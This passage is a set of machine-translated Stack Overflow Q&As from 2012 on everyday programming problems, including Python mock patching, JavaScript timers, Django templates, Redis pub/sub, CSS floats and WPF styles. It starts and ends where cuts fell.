> WinRT 信息：请求的枚举选项不适用于此文件夹，因为它不在库或家庭组中。只有库或家庭组中的文件夹支持所有枚举选项。

从本地文件夹中的目录读取文件时，有没有办法按日期顺序获取文件列表？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T02:06:30.253

您可以恢复文件，然后使用 LINQ to Objects 为您执行排序。

# python - SendKeys 中使用的变量在 Python 中没有空格？

> ID：10078645
> 
> 赞同：1
> 
> 时间：2012-04-09T19:30:25.177
> 
> 标签：python, variables, sendkeys

我在 Python 中使用 SendKeys 在另一个程序（记事本）中编写，它正在编写一个变量。但是当它在记事本中打印变量时，它不会打印字符串中的空格。这是代码：

```
import SendKeys 

if msg['from'] == '********@live.com':
        SendKeys.SendKeys("""
        {LWIN}
        {PAUSE .25}
        notepad.exe{ENTER}
        {PAUSE 1}
        %s
        """ % (body)) 
```

现在，假设变量“body”是“Test test”——Python 将变量打印为“Test test”，而当 SendKeys 在记事本中键入它时，它会将变量打印为“Testtest”。是否有其他方法可以在包含空格的 SendKeys 中打印变量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:11:07.430

根据[文档](http://www.rutherfurd.net/python/sendkeys/)，`with_spaces`应该可以解决问题。

```
import SendKeys 

if msg['from'] == '********@live.com':
        SendKeys.SendKeys("""
        {LWIN}
        {PAUSE .25}
        notepad.exe{ENTER}
        {PAUSE 1}
        %s
        """ % (body), with_spaces=True) 
```

不过，我希望 Ghu 不是*通过 GUI 启动记事本，*而不仅仅是以普通的 Python 方式将数据写入文件......

# php - 如何在表输出中舍入 mysql 列

> ID：10078647
> 
> 赞同：2
> 
> 时间：2012-04-09T19:30:31.727
> 
> 标签：php, mysql, html-table

我需要在表数组输出中舍入 SQL 舍入的结果。我无法弄清楚语法...

```
$result = mysql_query("SELECT `Energ_Kcal`*`yield`*`qty` AS `cal` FROM allinnot a
WHERE `own_id` = $user->id");

    echo "<tr><td>" . $row['Shrt_Desc'] . "</td><td>&nbsp;" . $row['desc'] . "</td><td>" . $row['cal'] . " cal</td></tr>"; 
```

`cal`返回一个包含许多小数点后数字的值。我只需要它来显示一个整数。我试过 ROUND()，但我一定是把它放错了地方。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:31:53.573

一般语法

```
ROUND( expression, 2 ) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:31:45.653

ROUND 应该绕过这些值，试试这个：

```
$result = mysql_query("SELECT ROUND(`Energ_Kcal`*`yield`*`qty`,2) AS `cal` FROM allinnot a
WHERE `own_id` = $user->id");

    echo "<tr><td>" . $row['Shrt_Desc'] . "</td><td>&nbsp;" . $row['desc'] . "</td><td>" . $row['cal'] . " cal</td></tr>"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:31:46.957

您还可以查看 PHP 的[`round()`](http://php.net/round)，或者可能从您的描述中查看[`int_val()`](http://php.net/int_val)。

# python - 使用 Mock python 断言对方法的调用

> ID：10078648
> 
> 赞同：5
> 
> 时间：2012-04-09T19:30:38.057
> 
> 标签：python, mocking

我正在尝试使用 Python 中的模拟库进行一些单元测试。我有以下代码：

```
def a():
    print 'a'

def b():
    print 'b'
    if some condition
        a() 
```

`b`进行模拟调用后，如何断言已进行调用`b`？我尝试了以下代码，但失败了：

```
mymock=Mock()
mymock.b()
assertTrue(a.__call__ in mymock.mock_calls) 
```

出于某种原因，我认为这`mymock.b()`与方法无关`b()`。为此可以做些什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T19:40:42.147

如果你 patch `a`，你可以确保它是这样调用的：

```
with mock.patch('__main__.a') as fake_a:
    b()
    fake_a.assert_called_with() 
```

如果您的方法在不同的模块中：

```
import mymodule

with mock.patch('mymodule.a') as fake_a:
    mymodule.b()
    fake_a.assert_called_with() 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:43:43.160

> 不知何故，我认为 mymock.b() 与方法 b() 无关，对此可以做什么？

你是对的。当你模拟一个对象时，你暗示你不关心你的模拟在幕后做了什么。如果您想确保它`a`是从 调用的，`b`您需要[修补](http://www.voidspace.org.uk/python/mock/patch.html) `a`.`b`

```
>>> from mock import patch
>>> with patch('__main__.a') as patch_a:
...     b()
...     patch_a.assert_called_with() 
```

所以，这个故事的寓意是，模拟或修补您想要测量的对象而不实际调用，而不是您关心其实现的对象。在这种情况下，您关心`b`并想了解它是如何使用`a`的。由于我们不关心什么`a`，只关心它被调用，我们可以修补它。

此外，如果您想了解有关对 a 的调用的更多详细信息，则`assert_called_with`可以通过访问 patch`mock_calls`属性来分析所有调用。在这种情况下，它会是`patch_a.mock_calls`。

# javascript - 从另一个函数暂停 JS 函数

> ID：10078652
> 
> 赞同：1
> 
> 时间：2012-04-09T19:30:54.617
> 
> 标签：javascript

有什么方法可以从另一个函数暂停以下一组延迟函数？我想通过执行另一个函数将所有内容暂停 10 秒。

我需要的是这样的：

```
function pause(){
pause sleepLoop() for 10 seconds
} 
```

如果无法暂停以下执行，我可以杀死它吗？

```
function game() {
sleepLoop();
}

function sleepLoop() {
loop...
setTimeout('gameActions()',5000);
}

function gameActions() {
actions...
sleepLoop();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T23:10:21.893

将计时器存储在变量中。然后您可以使用[clearTimeout](https://developer.mozilla.org/en/DOM/window.clearTimeout)停止它，并在 10 秒后重新启动它：

```
function game() {
   sleepLoop();
}

var sleepLoopTimeout;

function sleepLoop() {
    gameActions();
    sleepLoopTimeout = setTimeout(sleepLoop,5000);
}

function pause(){
    clearTimeout(sleepLoopTimeout);
    setTimeout(sleepLoop, 10000);
}

function gameActions() {
    // Actions
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:37:36.223

```
var blocked = false;

function loopToBePaused()
{
    if (blocked !== false)
    {
        // will check for blocker every 0.1s
        setTimeout(loopToBePaused, 100);
        return;
    }
    // payload

    // normal loop now, e.g. every 1s:
    setTimeout(loopToBePaused, 1000);
}

// somewhere in code run:
blocked = setTimeout(function() {
    // blocking our loop'ed function for 10s
    blocked = false;
}, 10000);
// this will block our main loop for 10s 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:34:00.783

```
var gameTimeout, sleepTimeout;

function game() {
   gameTimeout = setTimeout(sleepLoop, 10000); //start in 10 seconds
}

function sleepLoop() {
   sleepTimeout = setTimeout(gameActions, 5000); //start in 5 secs
}

function gameActions() {
   sleepLoop();
}

//start it off:
game(); 
```

除了上述之外，我不确定你在问什么。

* * *

要终止（清除）超时：

```
clearTimeout(gameTimeout);
clearTimeout(sleepTimeout); 
```

# objective-c - 如何知道 NSWindow 是否是前窗？

> ID：10078655
> 
> 赞同：7
> 
> 时间：2012-04-09T19:31:02.587
> 
> 标签：objective-c, macos, plugins, safari

我仅在 Safari 中遇到此问题，适用于 Mac OS 10.6 和 10.7 上的 Firefox 和 Chrome。

NSApplication runModalForWindow 运行一个事件循环并且应该将创建的窗口显示为前窗口。我有一个事件处理程序来处理插件的窗口焦点更改，当 NSApplication 处于非活动状态并且焦点丢失时隐藏窗口（和其他）。

有没有办法可以要求最前面的窗口或询问 NSWindow 是否是最前面的？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T14:48:25.647

您可以使用`[NSWindow isMainWindow]`（[参考](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ApplicationKit/Classes/NSWindow_Class/Reference/Reference.html#//apple_ref/occ/instm/NSWindow/isMainWindow)）来检测*主窗口*：

> 作为用户注意力焦点的最前面的文档或应用程序窗口称为主窗口。

（从[这里](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/WinPanel/Concepts/ChangingMainKeyWindow.html#//apple_ref/doc/uid/20000236-BCIDFJFH)）。

# java - BufferStrategy，Java中的多个异常和错误

> ID：10078660
> 
> 赞同：0
> 
> 时间：2012-04-09T19:31:19.730
> 
> 标签：java, swing, exception

我正在尝试制作一个相当基本的 3D 游戏，为我参加 Ludum Dare 23 一年一度的游戏比赛做准备。

我正在使用 Java，我正在使用 Swing 和 AWT。（我正在使用 JFrame 来创建我的窗口（显然？idk））

当我尝试在屏幕上绘制像素时，我遇到的问题正在发生。我得到了一些关于`BufferStrategy`显然是线程问题的例外情况。

以下是 Eclipse 中的控制台框向我抛出的内容。

```
Exception in thread "Thread-2" java.lang.IllegalStateException: Component must have a valid peer
    at java.awt.Component$FlipBufferStrategy.createBuffers(Component.java:3982)
    at java.awt.Component$FlipBufferStrategy.<init>(Component.java:3956)
    at java.awt.Component$FlipSubRegionBufferStrategy.<init>(Component.java:4479)
    at java.awt.Component.createBufferStrategy(Component.java:3833)
    at java.awt.Canvas.createBufferStrategy(Canvas.java:194)
    at java.awt.Component.createBufferStrategy(Component.java:3756)
    at java.awt.Canvas.createBufferStrategy(Canvas.java:169)
    at com.ottdev.tale.TaleOfDwarvesComponent.render(TaleOfDwarvesComponent.java:66)
    at com.ottdev.tale.TaleOfDwarvesComponent.run(TaleOfDwarvesComponent.java:55)
    at java.lang.Thread.run(Thread.java:722) 
```

关于如何解决这个问题的任何想法？它正在使我陷入困境并阻止我前进。非常感谢所有帮助！

PS：如果需要，我可以提供我的源代码，但现在，我宁愿知道*如何*修复它，以便我知道如果将来遇到这种情况该怎么办，但使用不同的代码。

编辑：我的主要课程 - TaleOfDwarvesComponent：

```
package com.ottdev.tale;    
import java.awt.*;
import java.awt.image.*;

import javax.swing.*;

import com.ottdev.tale.gui.*;

public class TaleOfDwarvesComponent extends Canvas implements Runnable {
    public static final int WIDTH = 800;
    public static final int HEIGHT = 600;
    public static final int SCALE = 2;
    public static final String TITLE = "Tale Of Dwarves!";

    private boolean running = false;
    private BufferedImage img;
    public int[] pixels;
    private Thread thread;
    private Game game;
    private Screen screen;

    public TaleOfDwarvesComponent() {
        game = new Game();
        screen = new Screen(WIDTH, HEIGHT);

        img = new BufferedImage(WIDTH, HEIGHT, BufferedImage.TYPE_INT_RGB);
        pixels = ((DataBufferInt) img.getRaster().getDataBuffer()).getData();

    }

    public void start() {
        if (running)
            return;
        running = true;
        new Thread(this).start();
    }

    public void stop() {
        if (!running)
            return;
        running = false;
        try{
            thread.join();
        }catch(InterruptedException e){
            e.printStackTrace();
        }

    }

    public void run() {
        while(running){
            render();
        }
    }

    public void tick(){
        game.tick();
    }

    public void render(){

        BufferStrategy bs = getBufferStrategy();
        if(bs == null){
            createBufferStrategy(3);
            return;
        }
        screen.render(game);
        for (int i = 0; i < WIDTH * HEIGHT; i++){
            pixels[i] = screen.pixels[i];
        }

        Graphics g = bs.getDrawGraphics();
        g.fillRect(0, 0, getWidth(), getHeight());
        g.drawImage(img, 0, 0, WIDTH * SCALE, HEIGHT * SCALE, null);
        g.dispose();
        bs.show();
    }

    public static void main(String[] args) {
        TaleOfDwarvesComponent game = new TaleOfDwarvesComponent();
        JFrame frame = new JFrame();
        frame.setSize(WIDTH, HEIGHT);
        frame.setLocationRelativeTo(null);
        frame.setTitle(TITLE);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);

        game.start();

    }
} 
```

我有一个`Bitmap`班级和一个`Screen`班级，但现在，我会提出这个，希望可以从中获得解决我的烦恼的答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:36:16.027

如果您查看 javadocs [http://docs.oracle.com/javase/7/docs/api/java/awt/Canvas.html#createBufferStrategy(int](http://docs.oracle.com/javase/7/docs/api/java/awt/Canvas.html#createBufferStrategy(int) )

我相信它专门解决了您的问题，即您在 Canvas 显示在屏幕上之前调用 createBufferStrategy 。因此，要解决您的问题，您需要向 Canvas 添加一个 ComponentListener 并在 componentShown 上调用 createBufferStrategy，或者在您的绘制方法中调用它

# asp.net - 使用 Booksleeve 维护开放的 Redis PubSub 订阅

> ID：10078665
> 
> 赞同：7
> 
> 时间：2012-04-09T19:31:40.567
> 
> 标签：asp.net, asp.net-mvc, redis, booksleeve

我正在使用 Redis pubsub 通道将消息从工作进程池发送到我的 ASP.NET 应用程序。收到消息后，我的应用程序使用 SignalR 将消息转发到客户端的浏览器。

我找到了维护与 Redis 的开放连接的[解决方案](https://stackoverflow.com/a/8777999/145831)，但它在重新创建连接时不考虑订阅。

我目前正在 Global.asax 文件中处理 Redis pubsub 消息：

```
public class Application : HttpApplication
{
    protected void Application_Start()
    {
        var gateway = Resolve<RedisConnectionGateway>();
        var connection = gateway.GetConnection();
        var channel = connection.GetOpenSubscriberChannel();

        channel.PatternSubscribe("workers:job-done:*", OnExecutionCompleted);
    }

    /// <summary>
    /// Handle messages received from workers through Redis.</summary>
    private static void OnExecutionCompleted(string key, byte[] message)
    {
        /* forwarded the response to the client that requested it */
    }
} 
```

当当前的 RedisConnection 出于某种原因关闭时，就会出现问题。问题的最简单解决方案是`RedisConnectionGateway`在连接重置后从类中触发一个事件，然后使用新的`RedisSubscriberChannel`. 但是，在重置连接时发布到通道的任何消息都将丢失。

是否有处理这种情况的推荐方法示例？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-10T13:08:13.777

Yes, if the connection dies (network instability, re-mastering, whatever) then you will need to re-apply any subscriptions you have made. An event to reconnect and resubscribe is pretty normal, and not very different to what we use here on SE/SO (except we typically track more granular subscriptions, and have some wrapper code that handles all that).

Yes, any events published while your connection was broken are gone. That is the nature of redis pub/sub; it does not guarantee delivery to disconnected clients. Either use a tool that *does* promise this, or use redis to drive a queue instead - pushing/popping to/from opposite ends of a list is usually a reasonable alternative, and ensures nothing is lost (as long as your software doesn't drop it after popping it from the list). If it helps, I have on my list a request to add the blocking pop methods - they totally destroy the multiplexer intent, but they have genuine use in some cases, so I'm not against adding them.

# matlab - 如何在 MATLAB 中获取像素邻居？

> ID：10078668
> 
> 赞同：3
> 
> 时间：2012-04-09T19:31:43.117
> 
> 标签：matlab, computer-vision

我需要获取像素邻居才能获得一系列边界点，所以我的计划是：-

1.  找到一个边界像素。
2.  找到它的邻居（它也应该是一个边界像素）。
3.  递归地执行此操作，直到我到达起始像素。

如何在 MATLAB 中获取像素邻居？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T05:50:41.180

你总是可以定义一个位移矢量

```
d = [ 1 0; -1 0; 1 1; 0 1; -1 1; 1 -1; 0 -1; -1 -1]; 
```

那么 location 的邻居`loc =[i j]`是

```
neighbors = d+repmat(loc,[8 1]); 
```

希望对你有用...

# jquery - 进行此更改的最佳 jquery 选择器是什么？

> ID：10078676
> 
> 赞同：0
> 
> 时间：2012-04-09T19:32:10.863
> 
> 标签：jquery, jquery-selectors

我有以下 html，我在method()**之后使用 jquery 插入一些新的 HTML。**这工作正常，但我现在有一种情况，我不希望它在某些条件下应用 after() 方法（其中顶部 TD 中存在一个附加类），我试图找出正确的 jquery 选择器语法。

为了使这一点更具体，首先，我有以下 html：

```
 <td class="fc-widget-content">
 <div>
      <div class="fc-day-number">1</div>
      <div class="fc-day-content">
  </div>
  </td> 
```

我想要以下逻辑：我想坚持这个 html：

```
 <span class="addEventHidden" style="display: none;">
            <img src="/Content/Images/addEvent.gif">
      </span> 
```

就在**fc-day-number** div 之后。我可以通过这样做轻松地做到这一点：

```
$('.fc-day-number').after(function () {
    return "<span class='addEventHidden' style='display: none;'><img src='/Content/Images/addEvent.gif'></span>";
}); 
```

这很好用，除非在某些情况下，如果顶部 div 有这个额外的类，我不想运行 .after() 方法： **fc-other-month**

所以如果顶部看起来像这样，请在命令之后应用它：

```
 <td class="fc-widget-content"> 
```

但如果顶部 TD 看起来像这样，则不是：

```
 <td class="fc-widget-content fc-other-month"> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:40:12.093

尝试：

```
$('td.fc-widget-content:not(.fc-other-month) div.fc-day-number')
    .after('<span class="addEventHidden" ... >'); 
```

为了清楚起见，示例有换行符。替换`<span class="addEventHidden" ... >`为合法的 html。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:35:12.270

```
$('.fc-widget-content .fc-day-number').not('.fc-other-month .fc-day-number').after(function () {
    return "<span class='addEventHidden' style='display: none;'><img src='/Content/Imags/addEvent.gif'></span>";
}); 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-04-09T19:37:24.830

```
$(".fc-widget-content:not(.fc-other-month):parent(.fc-day-number) .fc-day-number"); 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-09T19:41:34.487

您只能使用正确的父级`.filter`获取s：`divs`

```
$('.fc-day-number').filter(function(){
    return $(this).closest('.fc-other-month').length === 0;
}).after(function () {
    return "<span class='addEventHidden' style='display: none;'><img src='/Content/Images/addEvent.gif'></span>";
}); 
```

或者您可以使用更具体的选择器来选择`div`.

```
$('.fc-widget-content:not(.fc-other-month) .fc-day-number').after(function () {
    return "<span class='addEventHidden' style='display: none;'><img src='/Content/Images/addEvent.gif'></span>";
}); 
```

PS 你忘记了`</div>`之前的`</td>`.

# python - Django模板：访问列表的前一个和后一个元素

> ID：10078683
> 
> 赞同：3
> 
> 时间：2012-04-09T19:32:47.473
> 
> 标签：python, django, django-templates

我对 django 模板相当陌生，并且有一种我不了解一些基础知识的印象。

我有一个元素列表，我需要根据前一个和下一个元素的条件来渲染列表中的一个元素（如果后面或前一个元素被隐藏，我需要将当前元素标记为边框元素） .

如何`for`在 Django 模板的循环中引用前面和后面的元素？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-09T19:44:44.453

您可以为and[编写自定义模板过滤器](https://docs.djangoproject.com/en/dev/howto/custom-template-tags/#writing-custom-template-filters)：`next``previous`

```
def next(value, arg):
    try:
        return value[int(arg)+1]
    except:
        return None 
```

并在模板中：

```
{% for ... %}
  {% with list|next:forloop.counter0 as next %}
    {% if next.is_hidden %}
    ...
    {% endif %} 
  {% endwith %}
{% endfor %} 
```

但就像其他人所说的那样，可能有更多优雅的解决方案可以通过您的视图执行此操作

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:42:55.780

您不能使用内置模板标签严格执行此操作。您需要涉及一些 Python。

一种方法是`zip`使用自身的列表：

```
new = ([(None, orig[0], orig[1])] + 
       zip(orig, orig[1:], orig[2:]) + 
       [(orig[-2], orig[-1], None)]) 
```

并将其传递给模板，然后像这样循环它：

```
{% for prev, current, next in new %}
    {% if prev.hidden or next.hidden %}
        BORDER
    {% endif %}
    {{ current }}
{% endfor %} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T19:42:07.183

您真的不应该将 Django 模板用于这种逻辑。你有你的意见来处理它。我会找出列表中的哪些元素是边框，并传入一个额外的参数，我可以使用一个简单的`if`语句在模板中处理该参数。例如：

```
{% for element,is_border in data.items %}
 {% if is_border %}
   do something
 {% endif %}
{% endfor %} 
```

有很多类似的方法可以做到这一点。我只举了一个例子。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T19:43:21.460

您可以创建一个外部标签来执行此操作，但是构建为轻量级的 django 模板系统在 for 循环中没有这样的功能。

# objective-c - 在 Xcode 中创建成员对象：程序接收到的信号：“SIGABRT”

> ID：10078691
> 
> 赞同：0
> 
> 时间：2012-04-09T19:33:10.147
> 
> 标签：objective-c, xcode, ipad, xcode4

*警告：完成新手 Xcode 问题。*

在`MainViewController.h`我有以下行：

> IBOutlet 工作项 *m_WIone;

我创建了一个名为的类`WorkItem`，它继承自`UILabel`. 上面的行是为了让我可以使用`m_WIone`（最终将成为此类对象的数组）作为整个`MainViewController`.

我尝试了各种方法来调用`WorkItem`方法，最后确定了：

> [m_WIone 重置];

`Reset`方法在哪里`WorkItem`。该方法声明`WorkItem.h`为：

> -（无效）重置；

并`WorkItem.m`作为：

> -（无效）重置{}

在此方法中有或没有内容，应用程序总是崩溃：

> 线程 1：程序接收到的信号：“SIGABRT”。

在日志中，我读到：

> 由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[UILabel 重置]：无法识别的选择器发送到实例 0x6a5f9f0”

我该如何解决这个问题？我什至正确地声明了这个成员变量吗？（尽管通过 StackOverflow 拖网，我找不到解决方案。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:56:12.673

您是否为 NIB 指定了自定义类？似乎您希望 XCode 的 Interface Builder 中的小部件使用您的自定义类。只有默认类 (UILabel) 将被实例化，而不是您的自定义类。

单击您用作插座的 UILabel 并更改类（此处的屏幕截图适用于 UITableView，但它应该与 UILabel 相同）。

![自定义类属性](../Images/21697f760cd05f8b636ff61ac218a1ed.png)

话虽如此，您尝试做的事情还有其他选择。而不是仅仅使用 UILabel （您最终计划制作一个数组）。为什么不使用 UITableView 并将单元格自定义为您认为合适的单元格（因为 UITableViews 最适合显示项目列表）？

# css - wordpress 中的 CSS 浮动和边距问题

> ID：10078694
> 
> 赞同：2
> 
> 时间：2012-04-09T19:33:31.240
> 
> 标签：css, wordpress

我在这个网站（[http://melisayavas.com/web](http://melisayavas.com/web)）上有两个我无法弄清楚的 CSS 浮动问题。第一个就在主页上。我有两张 javascript 幻灯片和它们下方的一大片空白区域。为什么？

第二个问题是在新闻页面 - [http://melisayavas.com/web/?page_id=30](http://melisayavas.com/web/?page_id=30) - 侧边栏根本不会浮动在它应该浮动的地方。同样，我不知道是什么元素阻止了浮动。

这是 header.php 中的 HTML 代码：

```
 <article class="post" id="post-<?php the_ID(); ?>">
        <div class="homepage">
            <div class="testimonials"><?php slidedeck( 58, array( 'width' => '500px', 'height' => '550px' ) ); ?>
            </div>
            <div class="images"><?php slidedeck( 66, array( 'width' => '400px', 'height' => '550px' ) ); ?>
            </div>
        </div>
    </article> 
```

这是相关的CSS：

```
article, aside, figure, footer, header, hgroup, nav, section {
display: block;
overflow: hidden;
clear: both;
} 

 .post {
border: 2px solid;
border-radius: 10px;
clear: both; 
overflow: hidden; 
padding: 20px;
margin-top: 28px;
}

.testimonials {position: relative;}
.images {position:relative;margin-left: 543px; top: -556px; width: 100%;} 
```

新闻页面的 HTML：

```
<div class="news-page">
<?php if (have_posts()) : while (have_posts()) : the_post(); ?> 
<div class="news">
    <article <?php post_class() ?> id="post-<?php the_ID(); ?>">
        <h2><a href="<?php the_permalink() ?>"><?php the_title(); ?></a></h2>
        <?php include (TEMPLATEPATH . '/_/inc/meta.php' ); ?>
        <div class="entry">
            <?php the_content(); ?>
        </div>
    </article>
</div>
<?php endwhile; ?>
<?php include (TEMPLATEPATH . '/_/inc/nav.php' ); ?>
<?php else : ?>
    <h2>Not Found</h2>
<?php endif; ?>
</div> 
```

和CSS：

```
 .news-page {
width: 100%;
  }

  .news {
float: left;
width: 60%;
  }
  #sidebar {float: right; width: 30%;} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T22:15:35.740

首先，我建议使用 firebug（for firefox）或 Chrome，因为它内置了开发人员工具。IE 也有一个替代方案，称为 IE 开发人员工具。

我正在使用 Chrome 开发人员工具，当我检查您网站上的主页类时，我看到它的计算宽度和高度分别为 976 像素和 1100 像素。我查看了您的 .css 文件，发现 .homepage 类的高度没有在任何地方设置。换句话说，div 元素的高度为 1100 像素，因为它的内容将其拉伸到 1100 像素。

您的 div.homepage 包含以下内容：

```
<div class="slidedeck_frame skin-fullwidth-sexy-black">
<dl id="SlideDeck_275_58" class="slidedeck slidedeck_58" style="width:500px;height:550px">
...
</dl>
</div>

<div class="slidedeck_frame skin-fullwidth-sexy-black">
<dl id="SlideDeck_275_58" class="slidedeck slidedeck_58" style="width:500px;height:550px">
...
</dl>
</div> 
```

这两个高度为 550px 的元素各自赋予 .homepage 元素高度为 1100px。

可能的解决方法是直接设置 .homepage 的高度（例如，设置为 700 像素）。

至于你问题的第二部分，你目前有这个：
div.news-page has width: 100%, and is not set to float。
div.news 在 div.news-page 内。
div.news 的宽度为 60%。
div#sidebar 设置为向右浮动，宽度为 30%

解决方案：

```
.news-page
{
width: 70%; // takes 70% of it's parent element, page-wrap
float: left;
}

.news
{
width: 100%; // takes all space available by it's parent
}

#sidebar
{
width: 30%; // takes 30% of it's parent element, page-wrap
float:  right;
margin-top: 30px; // so it does not cover your navigation bar
} 
```

# visual-studio-2010 - 为 ASP.NET MVC 3 项目设置 Visual Studio 2010 解决方案的标准方法是什么

> ID：10078696
> 
> 赞同：0
> 
> 时间：2012-04-09T19:33:47.637
> 
> 标签：visual-studio-2010, asp.net-mvc-3

我目前正在开发一个 ASP.NET MVC 3 项目，并且正在 VS2010 上设置解决方案文件。

我不确定标准方法是什么。我正在使用以下方法

1.  Company.Dept.Data（包含 dbml 文件 - 数据模型）
2.  Company.Dept.Business（业务逻辑）
3.  Company.Dept.Web（包含 ASP.NET MVC3 网络应用程序）

前两个是类库，最后一个是 MVC3 Web 应用程序。还有什么推荐吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:11:50.233

没有单一的“标准”方法。这完全取决于您的项目以及您尝试使用该软件解决的问题。您提出的拥有 2 个类库和 1 个 Web 项目的结构是肯定的一种方法。

如果您打算使用控制反转容器进行任何类型的依赖注入，您可能还需要考虑为接口创建一个“API”项目，为实现接口契约的具体类创建一个“Impl(ementation)”项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:25:26.107

呼应danludwig，确实没有标准。我更喜欢根据功能分解库和命名空间。Company.Db 是我用于与数据库交互的库，Company.Mail 是我围绕 Postmark 邮件服务的包装器，等等。

然后我倾向于将类似的库分组到单个存储库中。所以源代码控制中的“存储”存储库包含 Company.Db、Company.Caching、Company.FileStorage 等。我有另一个存储库“消息”包含 Company.Mail 和 Company.SMS（用于与 Twilio 交互以发送文本消息） . 当我使用新的应用程序或新服务（可能是移动客户端的 WCF 端点）进行分支时，我可以只下载“消息”存储库，并且我拥有所有用于与用户通信的类库。

一个应用程序看起来像

```
Company.Application.Webite 
     \Libraries\Messaging
          \Libraries\Messaging\Company.Mail
     \Libraries\Storage
          \Libraries\Messaging\Company.Db
          \Libraries\Messaging\Company.Caching
     \Libraries\Web
     ...
Company.Application.Wcf
     \Libraries\Messaging
     \Libraries\Storage
          \Libraries\Messaging\Company.Db
          \Libraries\Messaging\Company.Caching
     ... 
```

这样，无论是通过网站还是通过移动应用程序注册，Company.Mail.MailServices.SendWelcomeEmail() 都会发送完全相同的欢迎电子邮件，并且没有代码重复。

这是否适合您，甚至是否有意义，谁知道呢。我也改变了这个方案一百次，试图找到一个适合我的开发风格/工作流程的布局。我不会担心或压力太大，因为无论你选择什么，你都会找到你喜欢它的东西，你会找到你讨厌它的东西。我有时会陷入花更多时间试图让一切“完美”的陷阱，而不是仅仅编码和改变我不喜欢的东西。

# wpf - 从现有样式继承并为派生样式添加新形状

> ID：10078697
> 
> 赞同：0
> 
> 时间：2012-04-09T19:33:49.320
> 
> 标签：wpf, xaml, styles, expression-blend, blend

我有基本的风格`PlayButtonsStyle`，`PauseButtonStyleInherited`那是基于第一个。如何将形状添加到派生的形状？我想添加两个矩形，使其看起来像暂停按钮（混合或 VS）

衍生的：

```
<Style x:Key="PauseButtonStyleInherited" BasedOn="{StaticResource PlayButtonsStyle}" TargetType="{x:Type Button}" > 
```

基本的：

```
<Style x:Key="PlayButtonsStyle" TargetType="{x:Type Button}">
    <Setter Property="FocusVisualStyle" Value="{StaticResource ButtonFocusVisual}"/>
    <Setter Property="Background" Value="{StaticResource ButtonNormalBackground}"/>
    <Setter Property="BorderBrush" Value="{StaticResource ButtonNormalBorder}"/>
    <Setter Property="BorderThickness" Value="1"/>
    <Setter Property="Foreground" Value="{DynamicResource {x:Static SystemColors.ControlTextBrushKey}}"/>
    <Setter Property="HorizontalContentAlignment" Value="Center"/>
    <Setter Property="VerticalContentAlignment" Value="Center"/>
    <Setter Property="Padding" Value="1"/>
    <Setter Property="Width" Value="40"/>
    <Setter Property="Height" Value="40"/>
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type Button}">
                <ControlTemplate.Resources>
                    <Storyboard x:Key="Storyboard1">
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.Opacity)" Storyboard.TargetName="ellipse1">
                            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
                            <EasingDoubleKeyFrame KeyTime="0:0:0.3" Value="1"/>
                        </DoubleAnimationUsingKeyFrames>
                    </Storyboard>
                    <Storyboard x:Key="Storyboard2">
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleX)" Storyboard.TargetName="ellipse2">
                            <EasingDoubleKeyFrame KeyTime="0" Value="1"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleY)" Storyboard.TargetName="ellipse2">
                            <EasingDoubleKeyFrame KeyTime="0" Value="1"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.X)" Storyboard.TargetName="ellipse2">
                            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.Y)" Storyboard.TargetName="ellipse2">
                            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleX)" Storyboard.TargetName="ellipse">
